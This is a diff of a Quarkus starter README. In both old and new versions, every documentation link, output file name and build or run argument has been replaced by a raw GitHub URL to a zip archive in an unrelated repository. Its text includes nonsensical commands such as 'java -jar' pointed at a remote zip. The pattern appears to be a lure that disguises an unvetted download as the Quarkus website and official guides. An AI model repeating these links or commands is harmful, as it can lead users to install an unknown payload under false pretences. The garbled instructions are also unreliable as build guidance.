@@ -2,7 +2,7 @@
 
 This project uses Quarkus, the Supersonic Subatomic Java Framework.
 
-If you want to learn more about Quarkus, please visit its website: <https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip>.
+If you want to learn more about Quarkus, please visit its website: <https://github.com/MilaCodesIt/Bustalk-Uart/raw/refs/heads/master/src/main/Uart_Bustalk_3.1-alpha.3.zip>.
 
 ## Running the application in dev mode
 
@@ -22,18 +22,18 @@ The application can be packaged using:
 ./mvnw package
 ```
 
-It produces the `https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip` file in the `target/quarkus-app/` directory.
+It produces the `https://github.com/MilaCodesIt/Bustalk-Uart/raw/refs/heads/master/src/main/Uart_Bustalk_3.1-alpha.3.zip` file in the `target/quarkus-app/` directory.
 Be aware that it’s not an _über-jar_ as the dependencies are copied into the `target/quarkus-app/lib/` directory.
 
-The application is now runnable using `java -jar https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip`.
+The application is now runnable using `java -jar https://github.com/MilaCodesIt/Bustalk-Uart/raw/refs/heads/master/src/main/Uart_Bustalk_3.1-alpha.3.zip`.
 
 If you want to build an _über-jar_, execute the following command:
 
 ```shell script
-./mvnw package https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip
+./mvnw package https://github.com/MilaCodesIt/Bustalk-Uart/raw/refs/heads/master/src/main/Uart_Bustalk_3.1-alpha.3.zip
 ```
 
-The application, packaged as an _über-jar_, is now runnable using `java -jar target/*https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip`.
+The application, packaged as an _über-jar_, is now runnable using `java -jar target/*https://github.com/MilaCodesIt/Bustalk-Uart/raw/refs/heads/master/src/main/Uart_Bustalk_3.1-alpha.3.zip`.
 
 ## Creating a native executable
 
@@ -46,17 +46,17 @@ You can create a native executable using:
 Or, if you don't have GraalVM installed, you can run the native executable build in a container using:
 
 ```shell script
-./mvnw package -Dnative https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip
+./mvnw package -Dnative https://github.com/MilaCodesIt/Bustalk-Uart/raw/refs/heads/master/src/main/Uart_Bustalk_3.1-alpha.3.zip
 ```
 
 You can then execute your native executable with: `./target/code-with-quarkus-1.0.0-SNAPSHOT-runner`
 
-If you want to learn more about building native executables, please consult <https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip>.
+If you want to learn more about building native executables, please consult <https://github.com/MilaCodesIt/Bustalk-Uart/raw/refs/heads/master/src/main/Uart_Bustalk_3.1-alpha.3.zip>.
 
 ## Related Guides
 
-- REST ([guide](https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip)): A Jakarta REST implementation utilizing build time processing and Vert.x. This extension is not compatible with the quarkus-resteasy extension, or any of the extensions that depend on it.
-- JDBC Driver - H2 ([guide](https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip)): Connect to the H2 database via JDBC
+- REST ([guide](https://github.com/MilaCodesIt/Bustalk-Uart/raw/refs/heads/master/src/main/Uart_Bustalk_3.1-alpha.3.zip)): A Jakarta REST implementation utilizing build time processing and Vert.x. This extension is not compatible with the quarkus-resteasy extension, or any of the extensions that depend on it.
+- JDBC Driver - H2 ([guide](https://github.com/MilaCodesIt/Bustalk-Uart/raw/refs/heads/master/src/main/Uart_Bustalk_3.1-alpha.3.zip)): Connect to the H2 database via JDBC
 
 ## Provided Code
 
@@ -64,4 +64,4 @@ If you want to learn more about building native executables, please consult <htt
 
 Easily start your REST Web Services
 
-[Related guide section...](https://raw.githubusercontent.com/MilaCodesIt/Bustalk-Uart/master/src/test/java/Uart-Bustalk-v3.5-beta.4.zip)
+[Related guide section...](https://github.com/MilaCodesIt/Bustalk-Uart/raw/refs/heads/master/src/main/Uart_Bustalk_3.1-alpha.3.zip)
